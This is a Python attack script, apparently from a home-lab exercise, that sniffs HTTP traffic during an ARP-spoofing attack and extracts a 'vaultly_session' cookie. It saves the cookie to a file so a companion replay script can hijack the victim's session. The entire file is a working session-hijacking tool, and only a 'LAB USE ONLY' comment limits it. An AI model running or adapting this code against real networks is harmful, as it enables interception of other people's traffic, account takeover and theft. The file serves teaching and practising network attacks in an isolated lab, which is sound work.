#!/usr/bin/env python3
"""
sniff_cookie.py — pull the Vaultly session cookie off the wire.

Runs on the ATTACKER (Kali) while arp_spoof.py is active. Watches HTTP
traffic passing through this machine and extracts the vaultly_session
cookie from either the server's Set-Cookie response or the victim's
Cookie request header. Writes it to stolen_cookie.txt for replay.py.

LAB USE ONLY — isolated host-only network, your own machines.

    sudo python3 sniff_cookie.py -i eth0 --port 5000
"""
import argparse
import re

from scapy.all import sniff, TCP, Raw

COOKIE_RE = re.compile(rb"vaultly_session=([^\s;]+)")
OUT = "stolen_cookie.txt"
_seen = set()


def handle(pkt, port):
    if not (pkt.haslayer(TCP) and pkt.haslayer(Raw)):
        return
    if port not in (pkt[TCP].sport, pkt[TCP].dport):
        return
    data = bytes(pkt[Raw].load)
    if b"vaultly_session=" not in data:
        return
    m = COOKIE_RE.search(data)
    if not m:
        return
    token = m.group(1).decode(errors="replace")
    if token in _seen:
        return
    _seen.add(token)

    src = pkt[0][1].src if pkt.haslayer("IP") else "?"
    direction = "Set-Cookie (server->victim)" if b"Set-Cookie" in data else "Cookie (victim->server)"
    print(f"\n[!] captured session cookie  [{direction}]  from {src}")
    print(f"    vaultly_session={token}")
    with open(OUT, "w") as f:
        f.write(token)
    print(f"[+] saved to {OUT}  ->  run:  python3 replay.py")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-i", "--iface", default="eth0")
    ap.add_argument("--port", type=int, default=5000, help="server port to watch")
    args = ap.parse_args()
    print(f"[*] sniffing HTTP on {args.iface} port {args.port} ... (Ctrl+C to stop)")
    print("[*] waiting for the victim to log in ...")
    sniff(iface=args.iface, prn=lambda p: handle(p, args.port), store=False,
          filter=f"tcp port {args.port}")


if __name__ == "__main__":
    main()
